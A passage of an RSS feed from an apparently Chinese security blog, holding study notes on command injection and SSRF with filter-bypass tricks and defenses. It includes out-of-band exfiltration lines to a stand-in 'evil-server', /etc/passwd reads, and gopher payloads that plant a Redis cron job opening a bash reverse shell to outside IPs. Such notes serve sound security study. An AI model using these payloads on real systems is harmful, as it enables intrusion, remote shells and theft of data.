&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9ncy5tc2RuLm1pY3Jvc29mdC5jb20vamVyZW15a3VobmUvMjAxNi8wNC8yMS9wYXRoLW5vcm1hbGl6YXRpb24v&#34;&gt;path normalization&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmJsYWNraGF0LmNvbS91cy0xOC9XZWQtQXVndXN0LTgvdXMtMTgtT3JhbmdlLVRzYWktQnJlYWtpbmctUGFyc2VyLUxvZ2ljLVRha2UtWW91ci1QYXRoLU5vcm1hbGl6YXRpb24tT2ZmLUFuZC1Qb3AtMGRheXMtT3V0LTIucGRm&#34;&gt;Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/</guid>
            <title>命令注入</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/</link>
            <category>注入</category>
            <category>函数</category>
            <category>绕过</category>
            <pubDate>Sat, 26 Nov 2022 17:30:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;命令注入通常因为指 Web 应用在服务器上拼接系统命令而造成的漏洞。&lt;/p&gt;
&lt;p&gt;该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些 Web 管理界面的配置主机名 / IP / 掩码 / 网关、查看系统信息以及关闭重启等功能，或者一些站点提供如 ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。&lt;/p&gt;
&lt;h1 id=&#34;常见危险函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见危险函数&#34;&gt;#&lt;/a&gt; 常见危险函数&lt;/h1&gt;
&lt;h2 id=&#34;php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; PHP&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;system&lt;/li&gt;
&lt;li&gt;exec&lt;/li&gt;
&lt;li&gt;passthru&lt;/li&gt;
&lt;li&gt;shell_exec&lt;/li&gt;
&lt;li&gt;popen&lt;/li&gt;
&lt;li&gt;proc_open&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;python&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python&#34;&gt;#&lt;/a&gt; Python&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;system&lt;/li&gt;
&lt;li&gt;popen&lt;/li&gt;
&lt;li&gt;subprocess.call&lt;/li&gt;
&lt;li&gt;spawn&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;java&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#java&#34;&gt;#&lt;/a&gt; Java&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;java.lang.Runtime.getRuntime().exec(command)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常见注入方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见注入方式&#34;&gt;#&lt;/a&gt; 常见注入方式&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;分号分割&lt;/li&gt;
&lt;li&gt;&lt;code&gt;||&lt;/code&gt;   &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;   &lt;code&gt;&amp;amp;&lt;/code&gt;  分割&lt;/li&gt;
&lt;li&gt;&lt;code&gt;|&lt;/code&gt;  管道符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\r\n&lt;/code&gt;   &lt;code&gt;%d0%a0&lt;/code&gt;  换行&lt;/li&gt;
&lt;li&gt;反引号解析&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$()&lt;/code&gt;  替换&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;无回显技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无回显技巧&#34;&gt;#&lt;/a&gt; 无回显技巧&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;bash 反弹 shell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS 带外数据&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;http 带外&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;curl http://evil-server/$(whoami)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wget http://evil-server/$(whoami)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无带外时利用  &lt;code&gt;sleep&lt;/code&gt;  或其他逻辑构造布尔条件&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常见绕过方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见绕过方式&#34;&gt;#&lt;/a&gt; 常见绕过方式&lt;/h1&gt;
&lt;h2 id=&#34;空格绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空格绕过&#34;&gt;#&lt;/a&gt; 空格绕过&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;  符号  &lt;code&gt;cat&amp;lt;123&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\t&lt;/code&gt;  /  &lt;code&gt;%09&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&amp;#123;IFS&amp;#125;&lt;/code&gt;   其中 {} 用来截断，比如 &lt;code&gt;cat$IFS2&lt;/code&gt;  会被认为 IFS2 是变量名。另外，在后面加个 $ 可以起到截断的作用，一般用 $9，因为 $9 是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;黑名单绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#黑名单绕过&#34;&gt;#&lt;/a&gt; 黑名单绕过&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;a=l;b=s;$a$b&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;base64  &lt;code&gt;echo &amp;quot;bHM=&amp;quot; | base64 -d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/?in/?s&lt;/code&gt;  =&amp;gt;  &lt;code&gt;/bin/ls&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;连接符  &lt;code&gt;cat /etc/pass&#39;w&#39;d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;未定义的初始化变量  &lt;code&gt;cat$x /etc/passwd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;长度限制绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度限制绕过&#34;&gt;#&lt;/a&gt; 长度限制绕过&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;wget\
&amp;gt;foo.\
&amp;gt;com
ls -t&amp;gt;a
sh a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的方法为通过命令行重定向写入命令，接着通过 ls 按时间排序把命令写入文件，最后执行 直接在 Linux 终端下执行的话，创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如 w,[之类的短命令，(使用 ls /usr/bin/? 查看) 如果不添加命令，需要 Ctrl+D 才能结束，这样就等于标准输入流的重定向 而在 php 中，使用 shell_exec 等执行系统命令的函数的时候，是不存在标准输入流的，所以可以直接创建文件&lt;/p&gt;
&lt;h1 id=&#34;常用符号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用符号&#34;&gt;#&lt;/a&gt; 常用符号&lt;/h1&gt;
&lt;h2 id=&#34;命令分隔符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令分隔符&#34;&gt;#&lt;/a&gt; 命令分隔符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%0a&lt;/code&gt;  /  &lt;code&gt;%0d&lt;/code&gt;  /  &lt;code&gt;\n&lt;/code&gt;  /  &lt;code&gt;\r&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;  /  &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;通配符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通配符&#34;&gt;#&lt;/a&gt; 通配符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt;  0 到无穷个任意字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?&lt;/code&gt;  一个任意字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt;  一个在括号内的字符，e.g.  &lt;code&gt;[abcd]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ - ]&lt;/code&gt;  在编码顺序内的所有字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[^ ]&lt;/code&gt;  一个不在括号内的字符&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;不使用时禁用相应函数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;尽量不要执行外部的应用程序或命令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;做输入的格式检查&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;转义命令中的所有 shell 元字符&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;shell 元字符包括  &lt;code&gt;#&amp;amp;;`,|*?~&amp;lt;&amp;gt;^()[]&amp;#123;&amp;#125;$\&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/</guid>
            <title>SSRF</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>SSRF</category>
            <pubDate>Sat, 26 Nov 2022 16:59:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。&lt;/p&gt;
&lt;h2 id=&#34;漏洞危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞危害&#34;&gt;#&lt;/a&gt; 漏洞危害&lt;/h2&gt;
&lt;p&gt;SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用 File 协议读取本地文件。&lt;/p&gt;
&lt;p&gt;内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在 SSRF 时，通常会造成较大的危害。&lt;/p&gt;
&lt;h1 id=&#34;利用方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用方式&#34;&gt;#&lt;/a&gt; 利用方式&lt;/h1&gt;
&lt;p&gt;SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。&lt;/p&gt;
&lt;p&gt;以 curl 为例，可以使用 dict 协议操作 Redis、file 协议读文件、gopher 协议反弹 Shell 等功能，常见的 Payload 如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -vvv &#39;dict://127.0.0.1:6379/info&#39;

curl -vvv &#39;file:///etc/passwd&#39;

# * 注意: 链接使用单引号，避免$变量问题

curl -vvv &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/103.21.140.84/6789 0&amp;gt;&amp;amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;相关危险函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关危险函数&#34;&gt;#&lt;/a&gt; 相关危险函数&lt;/h1&gt;
&lt;p&gt;SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有  &lt;code&gt;file_get_contents()&lt;/code&gt;  /  &lt;code&gt;fsockopen()&lt;/code&gt;  /  &lt;code&gt;curl_exec()&lt;/code&gt;  等。&lt;/p&gt;
&lt;h1 id=&#34;过滤绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤绕过&#34;&gt;#&lt;/a&gt; 过滤绕过&lt;/h1&gt;
&lt;h2 id=&#34;更改ip地址写法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更改ip地址写法&#34;&gt;#&lt;/a&gt; 更改 IP 地址写法&lt;/h2&gt;
&lt;p&gt;一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP，如采用如下正则表达式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;3&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;2&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;2&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于这种过滤我们采用改编 IP 的写法的方式进行绕过，例如 192.168.0.1 这个 IP 地址可以被改写成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;8 进制格式：0300.0250.0.1&lt;/li&gt;
&lt;li&gt;16 进制格式：0xC0.0xA8.0.1&lt;/li&gt;
&lt;li&gt;10 进制整数格式：3232235521&lt;/li&gt;
&lt;li&gt;16 进制整数格式：0xC0A80001&lt;/li&gt;
&lt;li&gt;合并后两位：1.1.278 / 1.1.755&lt;/li&gt;
&lt;li&gt;合并后三位：1.278 / 1.755 / 3.14159267&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外 IP 中的每一位，各个进制可以混用。&lt;/p&gt;
&lt;p&gt;访问改写后的 IP 地址时，Apache 会报 400 Bad Request，但 Nginx、MySQL 等其他服务仍能正常工作。&lt;/p&gt;
&lt;p&gt;另外，0.0.0.0 这个 IP 可以直接访问到本地，也通常被正则过滤遗漏。&lt;/p&gt;
&lt;h2 id=&#34;使用解析到内网的域名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用解析到内网的域名&#34;&gt;#&lt;/a&gt; 使用解析到内网的域名&lt;/h2&gt;
&lt;p&gt;如果服务端没有先解析 IP 再过滤内网地址，我们就可以使用 localhost 等解析到内网的域名。&lt;/p&gt;
&lt;p&gt;另外  &lt;code&gt;xip.io&lt;/code&gt;  提供了一个方便的服务，这个网站的子域名会解析到对应的 IP，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS0xOTItdWMwZXA5NmIuMTY4LjAuMS54aXAuaW8=&#34;&gt;例如 192.168.0.1.xip.io&lt;/span&gt;，解析到 192.168.0.1。&lt;/p&gt;
&lt;h2 id=&#34;利用解析url所出现的问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用解析url所出现的问题&#34;&gt;#&lt;/a&gt; 利用解析 URL 所出现的问题&lt;/h2&gt;
&lt;p&gt;在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。&lt;/p&gt;
&lt;p&gt;比如  &lt;code&gt;http://www.baidu.com@192.168.0.1/&lt;/code&gt;  当后端程序通过不正确的正则表达式（比如将 http 之后到 com 为止的字符内容，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS13d3cta2Q5ZHc1NGRzOW4uYmFpZHUuY29t&#34;&gt;也就是 www.baidu.com&lt;/span&gt;，认为是访问请求的 host 地址时）对上述 URL 的内容进行解析的时候，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1VUkxob3N0d3d3LXh4MnBoYTcxMGExdHpvNjRiZ2R6YWM5OGN3bnlib2s0YnFwYTY5N28uYmFpZHUuY29t&#34;&gt;很有可能会认为访问 URL 的 host 为 www.baidu.com&lt;/span&gt;，而实际上这个 URL 所请求的内容都是 192.168.0.1 上的内容。&lt;/p&gt;
&lt;h2 id=&#34;利用跳转&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用跳转&#34;&gt;#&lt;/a&gt; 利用跳转&lt;/h2&gt;
&lt;p&gt;如果后端服务器在接收到参数后，正确的解析了 URL 的 host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。&lt;/p&gt;
&lt;p&gt;可以使用如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2h0dHBiaW4ub3JnL3JlZGlyZWN0LXRvP3VybD1odHRwOi8vMTkyLjE2OC4wLjE=&#34;&gt;http://httpbin.org/redirect-to?url=http://192.168.0.1&lt;/span&gt; 等服务跳转，但是由于 URL 中包含了 192.168.0.1 这种内网 IP 地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。&lt;/p&gt;
&lt;p&gt;常用的跳转有 302 跳转和 307 跳转，区别在于 307 跳转会转发 POST 请求中的数据等，但是 302 跳转不会。&lt;/p&gt;
&lt;h2 id=&#34;通过各种非http协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过各种非http协议&#34;&gt;#&lt;/a&gt; 通过各种非 HTTP 协议&lt;/h2&gt;
&lt;p&gt;如果服务器端程序对访问 URL 所采用的协议进行验证的话，可以通过非 HTTP 协议来进行利用。&lt;/p&gt;
&lt;p&gt;比如通过 gopher，可以在一个 url 参数中构造 POST 或者 GET 请求，从而达到攻击内网应用的目的。例如可以使用 gopher 协议对与内网的 Redis 服务进行攻击，可以使用如下的 URL：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &amp;gt;&amp;amp; /dev/tcp/172.19.23.228/23330&amp;gt;&amp;amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;除了 gopher 协议，File 协议也是 SSRF 中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似  &lt;code&gt;file:///path/to/file&lt;/code&gt;  这种格式来访问计算机本地文件。使用 file 协议可以避免服务端程序对于所访问的 IP 进行的过滤。例如我们可以通过  &lt;code&gt;file:///d:/1.txt&lt;/code&gt;  来访问 D 盘中 1.txt 的内容。&lt;/p&gt;
&lt;h2 id=&#34;dns-rebinding&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-rebinding&#34;&gt;#&lt;/a&gt; DNS Rebinding&lt;/h2&gt;
&lt;p&gt;一个常用的防护思路是：对于用户请求的 URL 参数，首先服务器端会对其进行 DNS 解析，然后对于 DNS 服务器返回的 IP 地址进行判断，如果在黑名单中，就禁止该次请求。&lt;/p&gt;
&lt;p&gt;但是在整个过程中，第一次去请求 DNS 服务进行域名解析到第二次服务端去请求 URL 之间存在一个时间差，利用这个时间差，可以进行 DNS 重绑定攻击。&lt;/p&gt;
&lt;p&gt;要完成 DNS 重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的 DNS Server，在我们的可控的 DNS Server 上编写解析服务，设置 TTL 时间为 0。这样就可以进行攻击了，完整的攻击流程为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器端获得 URL 参数，进行第一次 DNS 解析，获得了一个非内网的 IP&lt;/li&gt;
&lt;li&gt;对于获得的 IP 进行判断，发现为非黑名单 IP，则通过验证&lt;/li&gt;
&lt;li&gt;服务器端对于 URL 进行访问，由于 DNS 服务器设置的 TTL 为 0，所以再次进行 DNS 解析，这一次 DNS 服务器返回的是内网地址。&lt;/li&gt;
&lt;li&gt;由于已经绕过验证，所以服务器端返回访问内网资源的结果。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用ipv6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用ipv6&#34;&gt;#&lt;/a&gt; 利用 IPv6&lt;/h2&gt;
&lt;p&gt;有些服务没有考虑 IPv6 的情况，但是内网又支持 IPv6，则可以使用 IPv6 的本地 IP 如  &lt;code&gt;[::]&lt;/code&gt;   &lt;code&gt;0000::1&lt;/code&gt;  或 IPv6 的内网域名来绕过过滤。&lt;/p&gt;
&lt;h2 id=&#34;利用idn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用idn&#34;&gt;#&lt;/a&gt; 利用 IDN&lt;/h2&gt;
&lt;p&gt;一些网络访问工具如 Curl 等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。&lt;/p&gt;
&lt;p&gt;在这些字符中，部分字符会在访问时做一个等价转换，例如  &lt;code&gt;ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ&lt;/code&gt;  和  &lt;code&gt;example.com&lt;/code&gt;  等同。利用这种方式，可以用  &lt;code&gt;① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩&lt;/code&gt;  等字符绕过内网限制。&lt;/p&gt;
&lt;h1 id=&#34;可能的利用点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可能的利用点&#34;&gt;#&lt;/a&gt; 可能的利用点&lt;/h1&gt;
&lt;h2 id=&#34;内网服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网服务&#34;&gt;#&lt;/a&gt; 内网服务&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Apache Hadoop 远程命令执行&lt;/li&gt;
&lt;li&gt;axis2-admin 部署 Server 命令执行&lt;/li&gt;
&lt;li&gt;Confluence SSRF&lt;/li&gt;
&lt;li&gt;counchdb WEB API 远程命令执行&lt;/li&gt;
&lt;li&gt;dict&lt;/li&gt;
&lt;li&gt;docker API 远程命令执行&lt;/li&gt;
&lt;li&gt;Elasticsearch 引擎 Groovy 脚本命令执行&lt;/li&gt;
&lt;li&gt;ftp /ftps（FTP 爆破）&lt;/li&gt;
&lt;li&gt;glassfish 任意文件读取和 war 文件部署间接命令执行&lt;/li&gt;
&lt;li&gt;gopher&lt;/li&gt;
&lt;li&gt;HFS 远程命令执行&lt;/li&gt;
&lt;li&gt;http、https&lt;/li&gt;
&lt;li&gt;imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）&lt;/li&gt;
&lt;li&gt;Java 调试接口命令执行&lt;/li&gt;
&lt;li&gt;JBOSS 远程 Invoker war 命令执行&lt;/li&gt;
&lt;li&gt;Jenkins Scripts 接口命令执行&lt;/li&gt;
&lt;li&gt;ldap&lt;/li&gt;
&lt;li&gt;mongodb&lt;/li&gt;
&lt;li&gt;php_fpm/fastcgi 命令执行&lt;/li&gt;
&lt;li&gt;rtsp - smb/smbs（连接 SMB）&lt;/li&gt;
&lt;li&gt;sftp&lt;/li&gt;
&lt;li&gt;ShellShock 命令执行&lt;/li&gt;
&lt;li&gt;Struts2 命令执行&lt;/li&gt;
&lt;li&gt;telnet&lt;/li&gt;
&lt;li&gt;tftp（UDP 协议扩展）&lt;/li&gt;
&lt;li&gt;tomcat 命令执行&lt;/li&gt;
&lt;li&gt;WebDav PUT 上传任意文件&lt;/li&gt;
&lt;li&gt;WebSphere Admin 可部署 war 间接命令执行&lt;/li&gt;
&lt;li&gt;zentoPMS 远程命令执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;redis利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redis利用&#34;&gt;#&lt;/a&gt; Redis 利用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;写 ssh 公钥&lt;/li&gt;
&lt;li&gt;写 crontab&lt;/li&gt;
&lt;li&gt;写 WebShell&lt;/li&gt;
&lt;li&gt;Windows 写启动项&lt;/li&gt;
&lt;li&gt;主从复制加载 .so 文件&lt;/li&gt;
&lt;li&gt;主从复制写无损文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;云主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#云主机&#34;&gt;#&lt;/a&gt; 云主机&lt;/h2&gt;
&lt;p&gt;在 AWS、Google 等云环境下，通过访问云环境的元数据 API 或管理 API，在部分情况下可以实现敏感信息等效果。&lt;/p&gt;
&lt;h1 id=&#34;防御方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御方式&#34;&gt;#&lt;/a&gt; 防御方式&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;过滤返回的信息&lt;/li&gt;
&lt;li&gt;统一错误信息&lt;/li&gt;
&lt;li&gt;限制请求的端口&lt;/li&gt;
&lt;li&gt;禁止不常用的协议&lt;/li&gt;
&lt;li&gt;对 DNS Rebinding，考虑使用 DNS 缓存或者 Host 白名单&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy45MXJpLm9yZy8xNzExMS5odG1s&#34;&gt;SSRF 漏洞分析与利用&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvdGh1cnNkYXkvdXMtMTctVHNhaS1BLU5ldy1FcmEtT2YtU1NSRi1FeHBsb2l0aW5nLVVSTC1QYXJzZXItSW4tVHJlbmRpbmctUHJvZ3JhbW1pbmctTGFuZ3VhZ2VzLnBkZg==&#34;&gt;A New Era Of SSRF&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3BocC1zc3JmLXRlY2huaXF1ZXMtOWQ0MjJjYjI4ZDUx&#34;&gt;php ssrf technique&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUFlUSE9OL2RlZmVuZC1zc3JmLXZ1bG5lcmFibGUtaW4tcHl0aG9uLmh0bWw=&#34;&gt;谈一谈如何在 Python 开发中拒绝 SSRF 漏洞&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cuc2FmZWJ1ZmYuY29tLzIwMTYvMDcvMDMvU1NSRi1UaXBzLw==&#34;&gt;SSRF Tips&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qb3ljaG91Lm9yZy93ZWIvcGhwc3NyZi5odG1s&#34;&gt;SSRF in PHP&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/</guid>
            <title>CSRF</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>CSRF</category>
            <pubDate>Sat, 26 Nov 2022 16:58:44 +0800</pubDate>
